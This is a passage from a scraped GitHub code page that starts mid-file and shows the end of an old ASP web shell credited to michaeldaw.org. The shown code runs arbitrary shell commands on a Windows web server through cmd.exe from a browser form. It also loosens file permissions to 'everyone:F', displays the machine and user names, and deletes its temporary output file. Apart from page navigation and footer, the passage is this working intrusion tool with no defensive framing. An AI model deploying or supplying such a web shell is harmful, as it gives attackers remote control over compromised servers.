perms</span></div><div class='line' id='LC21'>&nbsp;&nbsp;<span class="k">Call</span> <span class="n">oS</span><span class="p">.</span><span class="n">Run</span><span class="p">(</span><span class="s">&quot;win.com cmd.exe /c cacls.exe &quot;</span> <span class="o">&amp;</span> <span class="n">szTF</span> <span class="o">&amp;</span> <span class="s">&quot; /E /G</span></div><div class='line' id='LC22'><span class="s">everyone:F&quot;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="k">True</span><span class="p">)</span></div><div class='line' id='LC23'>&nbsp;&nbsp;<span class="k">Set</span> <span class="k">oF</span> <span class="o">=</span> <span class="n">oFSys</span><span class="p">.</span><span class="n">OpenTextFile</span><span class="p">(</span><span class="n">szTF</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="k">False</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span></div><div class='line' id='LC24'><span class="k">End</span> <span class="k">If</span> </div><div class='line' id='LC25'><span class="nt">%&gt;</span></div><div class='line' id='LC26'><span class="nt">&lt;FORM</span> <span class="na">action=</span><span class="s">&quot;</span><span class="nt">&lt;%=</span> <span class="n">Request</span><span class="p">.</span><span class="n">ServerVariables</span><span class="p">(</span><span class="s">&quot;URL&quot;</span><span class="p">)</span> <span class="nt">%&gt;</span>&quot; method=&quot;POST&quot;&gt;</div><div class='line' id='LC27'><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">text</span> <span class="na">name=</span><span class="s">&quot;C&quot;</span> <span class="na">size=</span><span class="s">70</span> <span class="na">value=</span><span class="s">&quot;</span><span class="nt">&lt;%=</span> <span class="n">szCMD</span> <span class="nt">%&gt;</span>&quot;&gt;</div><div class='line' id='LC28'><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">submit</span> <span class="na">value=</span><span class="s">&quot;Run&quot;</span><span class="nt">&gt;&lt;/FORM&gt;&lt;PRE&gt;</span></div><div class='line' id='LC29'>Machine: <span class="nt">&lt;%=</span><span class="n">oSNet</span><span class="p">.</span><span class="n">ComputerName</span><span class="nt">%&gt;&lt;BR&gt;</span></div><div class='line' id='LC30'>Username: <span class="nt">&lt;%=</span><span class="n">oSNet</span><span class="p">.</span><span class="n">UserName</span><span class="nt">%&gt;&lt;br&gt;</span></div><div class='line' id='LC31'><span class="nt">&lt;%</span> </div><div class='line' id='LC32'><span class="k">If</span> <span class="p">(</span><span class="n">IsObject</span><span class="p">(</span><span class="k">oF</span><span class="p">))</span> <span class="k">Then</span></div><div class='line' id='LC33'>&nbsp;&nbsp;<span class="k">On</span> <span class="k">Error</span> <span class="k">Resume</span> <span class="k">Next</span></div><div class='line' id='LC34'>&nbsp;&nbsp;<span class="n">Response</span><span class="p">.</span><span class="n">Write</span> <span class="n">Server</span><span class="p">.</span><span class="n">HTMLEncode</span><span class="p">(</span><span class="k">oF</span><span class="p">.</span><span class="n">ReadAll</span><span class="p">)</span></div><div class='line' id='LC35'>&nbsp;&nbsp;<span class="k">oF</span><span class="p">.</span><span class="n">Close</span></div><div class='line' id='LC36'>&nbsp;&nbsp;<span class="k">Call</span> <span class="n">oS</span><span class="p">.</span><span class="n">Run</span><span class="p">(</span><span class="s">&quot;win.com cmd.exe /c del &quot;</span><span class="o">&amp;</span> <span class="n">szTF</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="k">True</span><span class="p">)</span></div><div class='line' id='LC37'><span class="k">End</span> <span class="k">If</span> </div><div class='line' id='LC38'><br/></div><div class='line' id='LC39'><span class="nt">%&gt;</span></div><div class='line' id='LC40'><br/></div><div class='line' id='LC41'><span class="c">&lt;!--    http://michaeldaw.org   2006    --&gt;</span></div></pre></div></td>
         </tr>
       </table>
  </div>

  </div>
</div>

<a href="#jump-to-line" rel="facebox[.linejump]" data-hotkey="l" class="js-jump-to-line" style="display:none">Jump to Line</a>
<div id="jump-to-line" style="display:none">
  <form accept-charset="UTF-8" class="js-jump-to-line-form">
    <input class="linejump-input js-jump-to-line-field" type="text" placeholder="Jump to line&hellip;" autofocus>
    <button type="submit" class="button">Go</button>
  </form>
</div>

        </div>

      </div><!-- /.repo-container -->
      <div class="modal-backdrop"></div>
    </div><!-- /.container -->
  </div><!-- /.site -->


    </div><!-- /.wrapper -->

      <div class="container">
  <div class="site-footer">
    <ul class="site-footer-links right">
      <li><a href="https://status.github.com/">Status</a></li>
      <li><a href="http://developer.github.com">API</a></li>
      <li><a href="http://training.github.com">Training</a></li>
      <li><a href="http://shop.github.com">Shop</a></li>
      <li><a href="/blog">Blog</a></li>
      <li><a href="/about">About</a></li>

    </ul>

    <a href="/" aria-label="Homepage">
      <span class="mega-octicon octicon-mark-github" title="GitHub"></span>
    </a>

    <ul class="site-footer-links">
      <li>&copy; 2014 <span title="0.07324s from github-fe125-cp1-prd.iad.github.net">GitHub</span>, Inc.</li>
        <li><a href="/site/terms">Terms</a></li>
        <li><a href="/site/privacy">Privacy</a></li>
        <li><a href="/security">Security</a></li>
        <li><a href="/contact">Contact</a></li>
    </ul>
  </div><!-- /.site-footer -->
</div><!-- /.container -->


    <div class="fullscreen-overlay js-fullscreen-overlay" id="fullscreen_overlay">
  <div class="fullscreen-container js-fullscreen-container">
    <div class="textarea-wrap">
      <textarea name="fullscreen-contents" id="fullscreen-contents" class="fullscreen-contents js-fullscreen-contents" placeholder="" data-suggester="fullscreen_suggester"></textarea>
    </div>
  </div>
  <div class="fullscreen-sidebar">
    <a href="#" class="exit-fullscreen js-exit-fullscreen tooltipped tooltipped-w" aria-label="Exit Zen Mode">
      <span class="mega-octicon octicon-screen-normal"></span>
    </a>
    <a href="#" class="theme-switcher js-theme-switcher tooltipped tooltipped-w"
      aria-label="Switch themes">
      <span class="octicon octicon-color-mode"></span>
    </a>
  </div>
</div>



    <div id="ajax-error-message" class="flash flash-error">
      <span class="octicon octicon-alert"></span>
      <a href="#" class="octicon octicon-x close js-ajax-error-dismiss" aria-label="Dismiss error"></a>
      Something went wrong with that request. Please try again.
    </div>


      <script crossorigin="anonymous" src="https://assets-cdn.github.com/assets/frameworks-df9e4beac80276ed3dfa56be0d97b536d0f5ee12.js" type="text/javascript"></script>
      <script async="async" crossorigin="anonymous" src="https://assets-cdn.github.com/assets/github-094ba3c54f544b2a716758b64db1c2e7f8c3cf13.js" type="text/javascript"></script>
      
      
        <script async src="https://www.google-analytics.com/analytics.js"></script>
  </body>
</html>

